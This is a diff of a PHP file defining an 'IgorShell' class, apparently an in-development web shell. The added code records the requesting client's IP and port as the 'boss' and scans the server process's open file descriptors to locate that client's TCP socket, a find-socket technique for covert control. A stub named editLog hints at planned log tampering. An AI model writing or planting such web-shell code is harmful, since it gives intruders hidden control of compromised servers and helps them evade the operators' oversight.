@@ -15,14 +15,19 @@ ini_set('display_errors', true);
 
 class IgorShell {
 
-	private $pid;
-	private $nice;
+	private $m_Pid;
+	private $m_Nice;
 	private $m_FileDescriptors;
+	private $m_BossIp;
+	private $m_BossPort;
+	private $m_BossSock;
 
 	public function __construct() {
-		$this->m_Pid 				= getmypid();
+		echo $this->m_Pid 				= getmypid();
 		$this->m_Nice 				= $this->getProcessNice();
 		$this->m_FileDescriptors	= array();
+		$this->m_BossIp				= $_SERVER['REMOTE_ADDR'];
+		$this->m_BossPort			= $_SERVER['REMOTE_PORT'];
 	}
 
 	/**
@@ -33,7 +38,7 @@ class IgorShell {
 	private function getProcessNice ($pid = null) {
 
 	    if (!$pid) {
-	        $pid = $this->pid;
+	        $pid = $this->m_Pid;
 	    }
 	    
 	    // Execute ps -p [pid] -o %p %n in shell    
@@ -88,7 +93,7 @@ class IgorShell {
 			$this->getFileDescriptors();
 
 		foreach ( $this->m_FileDescriptors as $id => $fd ) {
-			echo 'FD #' . $id . ': ' . nl2br( print_r( $fd ) ) . '<br />';
+			echo 'FD #' . $id . ': ' . print_r( $fd, true ) . '<br />';
 		}
 	}
 
@@ -113,4 +118,41 @@ class IgorShell {
 	private function editLog( $fd = null ) {
 		// TODO: implement me.
 	}
+
+	/**
+	 *	Findsock method iterates over socket descriptors found
+	 *	untill it's found the requesting socket.
+	 */
+	public function findSock() {
+		
+		if(!$this->m_FileDescriptors)
+			$this->getFileDescriptors();
+
+		echo '<br />Searching for socket from ip: ' . $this->m_BossIp . ':' . $this->m_BossPort . '<br />';
+
+		foreach( $this->m_FileDescriptors as $id => $d ) {
+
+			// Skip if fd is not a socket
+			if( $d['type'] != 'tcp_socket' )
+				continue;
+
+			$remote = stream_socket_get_name($d['fd'], true);
+			
+			if( $remote == $this->m_BossIp . ':' . $this->m_BossPort) {
+
+				// Sock found!
+				$this->s_BossSock = $d['fd'];
+				echo 'Found sock! #' . $id . '<br />';
+				break;
+			}
+		}
+	}
+
 }
+
+$is = new IgorShell();
+$is->findSock();
+
+
+
+
